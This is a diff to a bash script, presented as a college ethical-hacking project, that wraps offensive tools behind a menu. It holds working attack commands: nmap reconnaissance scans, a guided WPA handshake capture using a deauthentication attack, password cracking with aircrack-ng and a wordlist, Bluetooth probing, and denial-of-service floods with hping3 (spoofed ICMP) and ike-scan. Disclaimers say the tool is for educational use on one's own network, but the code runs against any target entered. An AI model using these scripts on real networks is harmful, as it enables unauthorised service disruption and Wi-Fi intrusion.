@@ -7,18 +7,18 @@ PS3="scannstrike>" #prompt used to identify the program and tell the user they a
 homemenu()
 {
 #create a menu for the program using bash select, create sub menus within that can be used to run various modules
-echo "WARNING: Performing any of the techniques contained in this script against a network, device or organization without permission is a criminal offense. These techniques are to be  conducted ethichally and in line  with the law"
+echo "WARNING: Performing any of the techniques contained in this script against a network, device or organization without permission is a criminal offense."
 echo ""
 echo "Any Violation of these laws is not condoned by the Project creator as this project was created for educational purposes only as part of a college project"
 echo ""
-echo "Now that the elephant in the room has been addressed ! Be safe and I hope you enjoy trying these techniques on your own networks and devices"
+echo "Now that the elephant in the room has been addressed ! I hope you enjoy trying these techniques on your own networks and devices"
 echo ""
-homemenu=("Perform Recon" "Execute Denial of Service Attacks" "Execute Attacks on Smart Devices"  "Exit") #creates the sub menu and the output shown to the user
+homemenu=("Perform Network Recon" "Execute Denial of Service Attacks" "Execute Ethical Hacks"  "Exit") #creates the sub menu and the output shown to the user
 select opt in "${homemenu[@]}"; do
         if [ "$opt" = "Exit" ]; then
         echo "Quitting...Thank you for using scanndstrike!" && sleep 1 && clear
         exit 0
-        elif [ "$opt" = "Perform Recon" ]; then
+        elif [ "$opt" = "Perform Network Recon" ]; then
         echo ""
         echo "What type of Reconassaince would you like to conduct?"
         echo ""
@@ -32,7 +32,7 @@ select opt in "${homemenu[@]}"; do
         echo "To choose a certain module enter the number assigned to it and hit Enter!"
         echo ""
         dosattackmenu
-        elif [ "$opt" = "Execute Attacks on Smart Devices" ]; then
+        elif [ "$opt" = "Execute Ethical Hacks" ]; then
         echo ""
         echo "Here I have included some very cool hacking techniques you can perform on your own network and devices to test your security and discover how easy it can be for a hacker to access your information."
         echo ""
@@ -130,41 +130,46 @@ echo "sudo airmon-ng start wlan0"
 echo "    "
 echo "The following commands should be run only if your first attempt at this password attack is stopped due to an error:"
 echo "    "
-echo "1. sudo aircrack-ng start wlan0" 
-echo "2. sudo Ifconfig wlan0mon down "
+echo "1. sudo airmon-ng start wlan0" 
+echo "2. sudo ifconfig wlan0mon down "
 echo "3. sudo iwconfig wlan0mon mode monitor" 
 echo "4. sudo ifconfig wlan0mon up "
 echo "  "
 echo "Now that your system is ready to begin cracking your WIFIpassword we can begin with our first command "
 echo "Copy and paste the following command into the terminal window you had previously opened and press Enter. Command: sudo airodump-ng wlan0mon"
 echo "When this is running you will see of all the available Wireless Networks within range. You will notice theres also information about these networks such as a unique BSSID, Channel (CH), Data etc"
+echo "To breach your network we will require the networks BSSID and Channel and the name of a file chosen by you that will contain the WPA Handshake we will attempt to capture" 
 echo "   "
 read -i $TARGET -e TARGET
 read -i $CHANNEL -e CHANNEL
 read -i $FILE -e FILE
+#Run a live scan of the network and the devices connected to it
 echo "Now it is important that you follow this next step closely. In one of your open terminal windows paste the command: sudo airmon-ng -w" $FILE "-c" $CHANNEL "--bssid" $TARGET "wlan0mon"
-echo "Before you run that command ensure you have your second terminal window open and have th command: Sudo airoplay-ng -–deauth 0 -a " $TARGET "wlan0mon pasted in"
+#Run a deauthentication attack against the network while airmong ng is scanning the network and its connected devices in attempt to catch a device reconnecting to the network 
+echo "Before you run that command ensure you have your second terminal window open and have the command: sudo aireplay-ng -–deauth 0 -a " $TARGET "wlan0mon pasted in"
 echo "Now begin running both of these commands on focus on the terminal with the airmon-ng command, and look for a WPA Handshake message to appear above the current information displayed"
+#Check if the user has successfully captured the WPA Handshake
 echo "Have you successful been shown the WPA Handshake capture message? [Y]es , [N]o"
 read -i $ANS -e ANS
 if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                 echo "You must enter a valid answer"
                 elif [ "$ANS" = "y" ]; then  
-                echo "Do you have a [c]ustom  wordlist you would like to use against the target network or would you liew to use the [d]efault wordlist?"
+#Allows the user to use a custom wordlist they may have previously created rather than the default
+                echo "Do you have a [c]ustom  wordlist you would like to use against the target network or would you like to use the [d]efault wordlist?"
                 read -i $CHOICE -e  CHOICE
                 if [ "$CHOICE" = "c" ]; then
                 echo "PLease enter the name and location of your wordlist e.g if your wordlist is stored in Documents enter Documents/ followed by the name of your wordlist"
                 read -i $LIST -e LIST
-                sudo aircrack-ng -w $LIST $FILE-01.cap
+                sudo aircrack-ng -w  $LIST $FILE-01.cap
                 elif [ "$CHOICE" = "d" ]; then
-                sudo aircrack-ng rockyou.txt $FILE-01.cap
+                sudo aircrack-ng -w rockyou.txt $FILE-01.cap
                 else echo "Not a valid option! Using default list instead "
                 echo ""
                 sudo aircrack-ng -w rockyou.txt $FILE-01.cap
                 fi
                 elif [ "$SOURCE" = "n" ]; then
-                echo "Since WPA Handshake was not captured we will need to restart the process if you face errors retrying this you need to restart your machine"
-                else echo "Not a valid option! Therefore the process has been stopped."
+                echo "Since WPA Handshake was not captured we will need to restart the machine to try the process again"
+                else echo "Not a valid option! Therefore the process has been halted. Restart Required to try again "
                 echo ""
                 fi
 echo ""
@@ -232,7 +237,6 @@ cat Documents/$TEXT
 echo "You have  just created a password list ! These can be called upon when perfroming various penetration tests on your network/devices"
 echo "You can view this password list by entering cd Documents/"$TEXT  "into the command line once you have exited this program"
 }
-
 #End of Wordlist creation code
 bluebite()
 {
@@ -258,16 +262,16 @@ sdptool browse $MAC
 echo "You have now successfully snooped on a Bluetooth Device !"
 }
 #End of Bluetooth Targeting code
-
+ 
 ###############################################
 #End of Ethichal Hacking Menu and Modules Code#
 ###############################################
-
+ 
 
 #############################################
 #Start of the NetRecon Menu and Modules Code#
 #############################################
-
+ 
 #Start of the NetRecon Menu Code
 netreconmenu()
 {
@@ -282,17 +286,18 @@ netreconmenu()
 #Perform Quick Recon on the Network
     elif [ "$reconopt" = "Quick Scan" ]; then
         quickscan
+ 
 #Perform a stealthy scan on the Network
     elif [ "$reconopt" = "Detailed Scan" ]; then
         detailedscan
-
+ 
 #DNS Recon
     elif [ "$reconopt" = "DNS Recon" ]; then
         dnsrecon
 #DNS Recon
     elif [ "$reconopt" = "IP Sweep" ]; then
        ipsweep
-
+ 
 #Ping Sweep
     elif [ "$reconopt" = "Ping Sweep" ]; then
         pingsweep
@@ -306,11 +311,11 @@ netreconmenu()
         done
 }
 #End of the NetRecon Menu Code
-
+ 
 ###########################################
 # Start of the Net Recon Menu Module Code #
 ###########################################
-
+ 
 #Start of the ShowIP Code
 showip()
 {               echo "Curl is used to externally lookup the IP address"
@@ -329,6 +334,7 @@ showip()
                 echo ""
 }
 #End of the ShowIP Code
+ 
 #Start of the Quick Scan Code
 quickscan()
 { echo "This module was designed to conducts a scan of an entire network using nmap to search for common open ports"
@@ -349,7 +355,7 @@ read -i $SPEED -e SPEED
 sudo nmap -Pn -sS -T $SPEED $TARGET --reason
 }
 #End of the Quick Scan Code
-
+ 
 #Start of the Detailed Scan code
 detailedscan()
 { echo "This module implements the use of nmap to perform scans"
@@ -371,7 +377,7 @@ read -i $SPEED -e SPEED
 sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36  Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
 }
 #End of Detailed Scan Code
-
+ 
 
 
 #Start of the DNS Recon Code
@@ -393,7 +399,7 @@ sleep 1 && curl ipinfo.io/$TARGET
 fi
 }
 #End of DNS Recon Code
-
+ 
 ipsweep()
 { echo "Enter a target IP to sweep and an assign a name to the textfile that will store this information"
 echo "Example 192.168.1"
@@ -408,7 +414,7 @@ cat Documents/$TXTFILE
 echo "IP Sweep completed list of Ips found can be shown using the command: cat Documents/"$TXTFILE "in the command line"
 echo "To scan these IPs for open ports using nmap select the Detailed Scan option from the Menu"
 }
-
+ 
 #Start of the Ping Sweep Code
 pingsweep()
 { echo "This module performs a simple ICMP 'ping' sweep"
@@ -421,17 +427,15 @@ sudo nmap -sP -PE $TARGET --reason
 }
 #End of the Ping Sweep Code
 
-
-
 ############################################
 #End of Network Recon Menu and Modules Code#
 ############################################
-
+ 
 
 ###############################
 #Start of DOS Menu and Modules#
 ###############################
-
+ 
 #Start of DoS Menu Code
 dosattackmenu()
 {
@@ -457,11 +461,11 @@ dosattackmenu()
 done
 }
 #End of DoS Attack Menu Code
-
+ 
 ##################################
 # Modules of the DoS Attack Menu #
 ##################################
-
+ 
 #Start of ICMPFLOOD Code                                                                                                                                                                                                            2 ⨯
 icmpflood()
 {
@@ -473,7 +477,7 @@ icmpflood()
                 echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
         read -i $SOURCE -e SOURCE
         : ${SOURCE:=i}
- if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+        if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
                 echo "Starting ICMP Flood. Use 'Ctrl c' to end and return to menu"
                 sudo hping3 -1 --flood --spoof $SOURCE $TARGET
         elif [ "$SOURCE" = "r" ]; then
@@ -488,7 +492,7 @@ icmpflood()
         fi
 }
 #End of IMPCFLOOD code
-
+ 
 
 #Start of IPsec DoS Code
 ipsecdos()
@@ -502,7 +506,7 @@ do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike
 done
 }
 #End of the IPSEC DoS Code
-
+ 
 
 #Start of Distraction Scan Code
 distractionscan()
@@ -523,24 +527,27 @@ exit 0
 ####################################
 #End of DoS Attack Menu and Modules#
 ####################################
+ 
 
 
 ########################
 ##Opening Messages Code#
 ########################
-
+ 
 #Display opening message
 #since all the code above is being used to create functions (which must be defined before use) the opening message must be written as the last part of the script
 #This is to avoid any functionality issues and makes for a cleaner script
-
+ 
         clear && echo ""
+
+
 echo ""
 figlet "ScanndStrike" | lolcat
 echo ""
 echo "Welcome to scanndstrike!"
-echo "Please report all bugs, improvements and suggestions to https://github.com/Gareth-hub/EthichalHackingProject.git"
-echo "This software is only was created as part of a college project and is authorised for educational use only."
-echo "This project was conducted in line with legal requirements and is intended to be shared for educational purposes only"
+echo "Please report all bugs, improvements and suggestions to the Repository where you found this software."
+echo "This software was created as part of a college project and is authorised for educational use only."
+echo "This project was conducted in line with legal requirements."
 echo "YOU are responsible for your own actions!"
 echo ""
 echo "Basic Commands:"
@@ -550,5 +557,4 @@ echo ""
 echo ""
 homemenu
 #End Opening Message
-
-
+ 
